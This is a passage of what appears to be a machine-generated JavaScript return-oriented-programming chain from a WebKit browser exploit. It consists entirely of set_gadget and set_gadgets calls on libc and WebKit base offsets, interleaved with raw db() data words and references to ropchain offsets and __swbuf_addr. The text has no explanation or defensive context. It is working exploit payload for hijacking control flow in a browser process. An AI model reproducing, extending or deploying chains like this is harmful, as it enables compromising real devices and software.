db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+134688, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+134792, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+134824, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+134808, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+134896, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+134912, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+135008, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+134992, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+135088, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([10, 0]); 
set_gadget(libc_base+788575,); 
db([10, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+135240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+135256, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+135224, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+135424, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+135440, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+135408, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+135560, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+135592, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+135544, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+135664, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+882884, 
libc_base+793877, 
ropchain+135784, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+135800, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+135768, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+135920, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+135952, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+135904, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+389047, 
libc_base+269973, 
libc_base+793877, 
ropchain+136024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+882884, 
libc_base+793877, 
ropchain+136144, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+136160, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+136128, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+136264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+136312, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+136280, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+136424, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+136416, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+136440, 
ropchain+138736, 
libc_base+793877, 
ropchain+136480, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+136584, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+136600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+136752, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+136784, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+136768, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+136736, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+136856, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+136872, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+137032, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+137000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+136984, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+137136, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+137120, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+137216, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+137320, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+137336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+137408, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+137424, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+137568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+137536, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+137552, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+137656, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+137744, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+137848, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+137864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+137968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+137952, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+138024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+138144, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+138200, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+138344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+138312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([56, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+138472, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+138488, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+138456, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+138584, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+138600, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+138712, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+138696, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+811575, 
ropchain+140144, 
libc_base+793877, 
ropchain+138776, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([24, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+138880, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+138896, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+139040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+139008, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+139024, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+139120, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+139224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+139240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+139392, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+139424, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+139408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+139376, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+139520, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+139504, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+139624, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+140456, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+139760, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+139776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+139744, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+139896, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+139912, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+139880, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+140008, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+140024, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+140136, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+140120, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+140224, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+140208, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+140320, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+140336, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+140448, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+140432, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
__swbuf_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+141776, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+141848, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+141936, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+141968, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+142056, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+142072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+142192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+142208, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+142176, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+142304, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+142320, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+142432, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+142416, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+142520, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+142504, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+142616, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+142632, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+142744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+142728, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+142816, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+142904, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+142936, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+143024, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+143040, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+143192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+143224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+143208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+143176, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+143384, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+143352, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+143336, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([32, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+877568, 
libc_base+793877, 
ropchain+143512, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+143528, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+143496, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+143624, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+143640, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+143752, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+143736, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+143840, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+143824, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+143936, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+143952, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+144064, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+144048, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+144136, 
webkit_base+7438103, 
libc_base+759626, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+144224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+144256, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([16, 0]); 
set_gadget(webkit_base+432898,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+144344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+144360, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+270800, 
libc_base+793877, 
ropchain+144520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+144488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+144472, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([16, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
